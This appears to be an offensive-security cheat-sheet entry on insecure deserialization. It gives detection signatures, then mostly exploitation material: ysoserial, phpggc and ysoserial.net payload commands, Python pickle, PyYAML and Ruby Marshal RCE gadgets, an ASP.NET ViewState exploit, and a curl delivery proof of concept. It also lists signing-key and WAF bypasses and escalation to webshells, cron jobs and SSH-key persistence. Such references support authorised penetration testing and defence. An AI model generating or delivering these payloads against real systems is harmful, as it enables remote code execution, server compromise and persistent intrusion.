# Insecure Deserialization

> **Summary**: Exploit applications that deserialize untrusted data, allowing object injection through crafted serialized payloads.
> **Impact**: Remote code execution, authentication bypass, denial of service, privilege escalation.
> **Typical Severity**: Critical

## Detection

### Indicators
- Serialized data in cookies, hidden fields, API parameters, or file uploads
- Content-Type headers indicating serialized formats (`application/x-java-serialized-object`, `application/x-php-serialized`)
- Base64-encoded blobs in parameters or cookies

### Black-Box Detection (Magic Bytes)

| Signature | Format |
|-----------|--------|
| `a:4:{i:0;s:4:"Test"...}` | PHP serialized |
| `AC ED 00 05` (hex) / `rO0ABXNy` (base64) | Java ObjectInputStream |
| `AAEAAAD/////` (base64) / `00 01 00 00 00 ff ff ff ff` (hex) | .NET BinaryFormatter |
| `80 03` / `80 04 95` (hex) | Python Pickle (protocol 2-5) |
| `04 08` (hex) | Ruby Marshal |
| Strings containing `$type`, `__type`, `TypeObject` | .NET JSON deserializers |

### White-Box Detection (Dangerous Functions)

| Function | Language |
|----------|----------|
| `unserialize()` | PHP |
| `pickle.loads()` | Python (Pickle) |
| `jsonpickle.decode()` | Python (JSONPickle) |
| `yaml.load()` (without SafeLoader) | Python (PyYAML) |
| `readObject()` | Java |
| `XMLDecoder.readObject()` | Java |
| `Deserialize()`, `ReadObject()` | C# / .NET |
| `Marshal.load()` | Ruby |
| `JSON.parse()` with reviver abuse | Node.js |

#### .NET Dangerous Deserializers

| Deserializer | Sink Method |
|-------------|-------------|
| BinaryFormatter | `.Deserialize(...)` |
| NetDataContractSerializer | `.ReadObject(...)` |
| LosFormatter | `.Deserialize(...)` |
| ObjectStateFormatter | `.Deserialize(...)` |
| SoapFormatter | `.Deserialize(...)` |
| Json.NET (with TypeNameHandling) | `JsonConvert.DeserializeObject(...)` |
| JavaScriptSerializer (with TypeResolver) | `.Deserialize(...)` |
| XmlSerializer (with dangerous types) | `.Deserialize(...)` |
| YamlDotNet (with unsafe config) | `.Deserialize<...>(...)` |
| fastJSON | `JSON.ToObject(...)` |

## Exploitation

### Prerequisites
- Application deserializes user-controlled data
- Gadget chain available in application classpath/dependencies
- No input validation or signing on serialized data (or signing key is known)

### Step-by-Step
1. **Identify serialized data** -- look for magic bytes, base64 blobs, or content types
2. **Determine the language/framework** -- error messages, response headers, file extensions
3. **Find available gadget chains** -- match libraries/frameworks to known chains
4. **Generate payload** -- use ysoserial (Java), ysoserial.net (.NET), phpggc (PHP), or custom scripts
5. **Deliver payload** -- replace serialized data in cookie, parameter, or upload
6. **Verify execution** -- DNS callback, sleep delay, HTTP request to attacker server
7. **Success criteria**: Out-of-band callback received or command output observed

### Payloads by Language

#### Java (ysoserial)
```bash
# List available gadget chains
java -jar ysoserial.jar --help

# Generate payload (common chains: CommonsCollections1-7, Groovy1, Spring1)
java -jar ysoserial.jar CommonsCollections6 '<COMMAND>' | base64

# DNS callback for detection
java -jar ysoserial.jar URLDNS 'http://<BURP_COLLABORATOR>' | base64

# GadgetProbe for classpath enumeration
java -jar ysoserial.jar GadgetProbe '<BURP_COLLABORATOR>' | base64
```

**Blind detection via DNS**:
Use URLDNS gadget (no dependency requirements) to confirm deserialization occurs.

**JSF ViewState**:
If ViewState is not encrypted, inject serialized Java objects via the `javax.faces.ViewState` parameter.

#### PHP (phpggc)
```bash
# List gadget chains for a framework
phpggc -l Laravel
phpggc -l Symfony

# Generate RCE payload (base64 encoded)
phpggc Laravel/RCE9 system '<COMMAND>' -b

# Generate PHAR deserialization payload
phpggc -p phar Laravel/RCE9 system '<COMMAND>' -o exploit.phar

# Symfony RCE
phpggc Symfony/RCE4 exec '<COMMAND>' -b
```

**PHAR deserialization**: Upload a `.phar` file and trigger deserialization via `phar://` wrapper in file operations (`file_exists()`, `file_get_contents()`, `include()`).

#### Python (Pickle)
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("<COMMAND>",)

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

**PyYAML** (if `yaml.load()` without SafeLoader):
```yaml
!!python/object/apply:os.system ['<COMMAND>']
```

#### .NET (ysoserial.net)

```powershell
# ObjectDataProvider gadget
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "<COMMAND>" -o Raw

# TypeConfuseDelegate gadget
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "<COMMAND>" -o base64

# XmlSerializer gadget
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "<COMMAND>" -o Raw

# Common formatters: Json.Net, BinaryFormatter, SoapFormatter, XmlSerializer, LosFormatter
# Common gadgets: ObjectDataProvider, TypeConfuseDelegate, PSObject, WindowsIdentity
```

**ViewState exploitation** (ASP.NET):
```bash
# If MachineKey is known (from web.config leak)
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<COMMAND>" --validationalg="SHA1" --validationkey="<KEY>" --generator="<GENERATOR>" --viewstateuserkey="<USERKEY>" --isdebug
```

#### Ruby (Marshal)
```ruby
# Custom gadget via Marshal
require 'erb'
require 'base64'

payload = ERB.allocate
payload.instance_variable_set(:@src, "<%= system('<COMMAND>') %>")
# Serialize and deliver
puts Base64.encode64(Marshal.dump(payload))
```

### Proof of Concept
```bash
# Java -- trigger DNS callback to confirm deserialization
java -jar ysoserial.jar URLDNS 'http://<BURP_COLLABORATOR>' > payload.bin

# PHP -- trigger sleep to confirm
phpggc Symfony/RCE4 exec 'sleep 10' -b

# Deliver via curl
curl -X POST http://<TARGET>/api/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

## Bypasses
- **Signed serialized data** -- leak or brute-force the signing key (e.g., ASP.NET MachineKey, Django SECRET_KEY)
- **Class whitelisting** -- find gadget chains using only whitelisted classes
- **WAF blocking known payloads** -- encode payload differently (gzip, custom encoding)
- **PHAR wrapper restrictions** -- use alternative wrappers or polyglot files
- **Look-ahead deserialization filters (Java)** -- use gadgets from allowed packages

## Escalation
- **RCE** --> full server compromise via OS command execution
- **File read/write** --> access configuration files, plant webshells
- **SSRF** --> chain with URLDNS or HTTP gadgets for internal network access
- **Denial of Service** --> craft deeply nested objects to exhaust resources
- **Persistence** --> write cron jobs, scheduled tasks, or SSH keys via file write gadgets

## Tools

| Tool | Usage |
|------|-------|
| [ysoserial](https://github.com/frohoff/ysoserial) | Java deserialization payload generator |
| [ysoserial.net](https://github.com/pwntester/ysoserial.net) | .NET deserialization payload generator |
| [phpggc](https://github.com/ambionics/phpggc) | PHP gadget chain generator |
| [GadgetProbe](https://github.com/BishopFox/GadgetProbe) | Java classpath enumeration via deserialization |
| [Freddy](https://github.com/nccgroup/freddy) | Burp Suite extension for deserialization detection |
| [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) | Burp extension for Java deserialization |
| [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r) | ASP.NET ViewState MachineKey brute-forcer |
| [marshalsec](https://github.com/mbechler/marshalsec) | Java unmarshaller exploit toolkit |

## References
- [PortSwigger - Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [PayloadsAllTheThings - Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Java Deserialization - The Forgotten Bug Class](https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class)
- [Exploiting ViewState Deserialization](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
- [OWASP - Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

## See Also
- [Command Injection](command-injection.md)
- [XXE](xxe.md)
- [SSTI](ssti.md)
